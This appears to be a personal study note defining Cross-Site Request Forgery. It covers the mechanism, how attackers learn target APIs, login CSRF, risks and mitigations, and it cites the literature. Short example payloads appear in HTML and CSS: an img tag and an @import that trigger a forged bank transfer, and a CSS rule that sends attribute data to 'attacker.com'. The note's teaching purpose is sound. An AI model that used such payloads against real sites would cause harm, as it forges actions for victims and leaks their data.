---
ID: 2025-02-03-15:11
tags:
  - "#definition"
  - cyberSecurity
  - clientSideAttacks
  - CSFR
---
Also known as XSRF, Confused Deputy, one-click-attack, Session Riding [[(Maes, Heyman, et al., 2009)]]
## Definition

Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to perform an unwanted action on a website they are logged in to, without their knowledge or consent
- This is possible exploiting authentication cookies or [[sessions token]] of the victim [[(Tkachenko et al., 2024)]]
- ==Many websites trust requests from an authenticated browser, without checking whether the user actually intended them==

Even if is called Cross-Site Request Forgery, technically the CSRF attack can be executed withing the same domain, due to a [[XSS (cross site scripting)]] vulnerability or when multiple users can host a web site within the same domain (e.g., universities) [[(Maes, Heyman, et al., 2009)]]

### CSRF Mechanism

- The user is logged into a legitimate website (e.g., bank.com) and remains authenticated while browsing the internet[^1]. This website must use implicit authentication
- An attacker tricks the user into visiting *another* malicious website[^2]
- The malicious website executes code that sends an HTTP request to the previous legitimate website (bank.com), exploiting the user's active session. The HTTP request ==will automatically attach the session cookie, therefore the attacker does not have even to know it== (unless [[SameSite cookie]] are activate, which is only true in Chrome by now)
- Since the user's browser is still authenticated, the legitimate website accepts the request as valid, performing the fraudulent action on behalf of the user.

### How can the attacker know what HTTP request to send?

The hacker has to know pretty well the API structure of the target website in order to make the right HTTP request that will, for example, execute an unwanted transaction. This is possible because:
- he is using the website `bank.com` himself, so he can see what API are used
- he has reverse engineered the website's API structure
- he has access to technical documentation of the target website 
- he exploits common pattern such as `POST /update_profile`
- he has access to company documentation, emails, or public discussion forums [[(Felsch, Heiderich, et al., 2015)]]

The attack does not even require a JavaScript snippet to be executed. If the server does not check the type of request, is it technically possible to execute a CSRF using GET request implicitly defined in:

- HTML, via  `<img>`, or `<a>` tags [[(Felsch, Heiderich, et al., 2015)]]

```html
<img src="https://banca.com/transfer?amount=5000&to_account=123456">
```

- CSS, using HTML attributes as source of dynamic values [[(Maes, Heyman, et al., 2009)]]

```css
/* it will execute a GET request with parameters */
div[secret-data] {
    background-image: url("https://attacker.com/log?data="attr(secret-data));
}

```

- using the CSS `@import` statement

```css

@import url("https://banca.com/transfer?amount=5000&to_account=123456");

```

### CSRF variants

**Login CSRF** [[(Trampert, Stock, et al., 2023)]]
- the attacker forces the victim to log into the attacker’s account on some service. While this may sound counterintuitive initially, it allows the attacker to track their victim’s activities, e.g., following their search history, since that history is now tied to the attacker’s account.

### Risks and consequences

Common CSFR includes:
- changing user's credentials, making the account unusable for the user and stealing his identity
- sending unwanted transactions

### Mitigation techniques

- [[SOP (Same-Origin Policy)]] is the first layer of protection, preventing malicious script to directly read cookies or access the DOM of other websites
- Using [[CSRF (cross-site request forgery) token]], which are in essence random values embedded into form fields. If the server does not receive the token that expects, the HTTP request is rejected
- verifying the source of the request (original header): `referrer` header has been proposed as a solution, but it carries privacy concerns as is often suppressed by browsers. The `origin` header is more considerate of privacy but not well supported [[(Pelizzi, Sekar, et al., 2011)]]
- limiting HTTP request methods
- using [[SameSite cookie]] [[(Saleh, Malkawi, et al., 2024)]]
- closing all the tabs except for the one you are using may be an effective mitigation strategy, but ==if you landed on a malicious website *before* reaching the target, malicious HTTP requests may have been hidden and then executed in the background (this can be done with a [[service worker]])==

Other client-side protections from [[(Maes, Heyman, et al., 2009)]]:
- browser extensions: RequestPolicy, BEAP, CSRF Protector, SOMA
- client-side proxy: RequestRodeo

Usually these countermeasures monitor outgoing requests and incoming responses, and filter out implicit authentication or block cross-domain requests. Cons:
- degrading user experience
- degrading application performance
- fail to protect against GET-based CSRF

**Why not blocking all the cross-domain POST request?**
- sometimes front-end and back-end live in different domains (e.g., `example.com` is a SPA application written in Vue.js ask requests to a PHP back-end which is a completely different application hosted somewhere else)
- some web applications leverage on public APIs
- third-party services (Stripe, for payments, [[OAuth]] or [[OpenID]] for authentication) are used

---

#### See also

There are similarities between CSRF and [[XSS (cross site scripting)]]. While the XSS is a general abuse of a website leading to malicious script execution, CSRF is focused on performing actions on behalf of an unsuspecting user (see [[XSS and CSFR comparison]]).

#### References
- [[(Tkachenko et al., 2024)]]
- Included in literature review, by [[(Onukrane, Skrodelis, et al., 2023)]]
- Unsystematic and short literature review by [[(Farah, Shojol, et al., 2016)]]
- Server-side mitigation tool jCSRF, by [[(Pelizzi, Sekar, et al., 2011)]]
- Attack simulation, by [[(Saleh, Malkawi, et al., 2024)]]
- client-side defense policies, [[(Maes, Heyman, et al., 2009)]]
- server-side proxy, [[(Liu, Shen, et al., 2020)]]

[^1]: For more about authentication mechanisms and session management, see [[cookie]], [[sessions token]], [[JWT (JSON Web Token)]]

[^2]: This can be done in different forms. For example, via a [[phishing]] email, using malicious embedded image or malicious forms in a website vulnerable to [[XSS (cross site scripting)]], exploiting [[clickjacking]] or [[tabnabbing]] attacks
